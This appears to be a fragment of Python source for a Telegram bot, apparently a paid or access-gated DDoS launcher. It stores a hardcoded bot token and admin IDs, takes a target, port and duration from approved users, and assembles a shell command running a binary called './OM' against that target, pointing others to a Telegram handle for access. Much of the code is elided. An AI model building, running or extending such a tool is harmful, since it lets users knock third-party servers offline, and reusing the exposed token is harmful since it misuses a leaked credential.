...
bot = telebot.TeleBot('7673893085:AAFWuEuuRK9FvbjjNYKlmogS1-nkpB8fuKQ')
# DEVELOPER --> @S4_LUCHI
# Admin user IDs
admin_id = ["6665178967"]
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./OM {target} {port} {time} 100"
        ...
        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 @TOMislive"
...
def show_admin_commands(message):
    ...
    if user_id in admin_id:
        ...
        response += "/remove <user_id> - Remove a user@TOMislive\n"
        bot.reply_to(message, response)
    else:
        response = "PAPA SE BAAT KAR = @TOMislive."
        bot.reply_to(message, response)
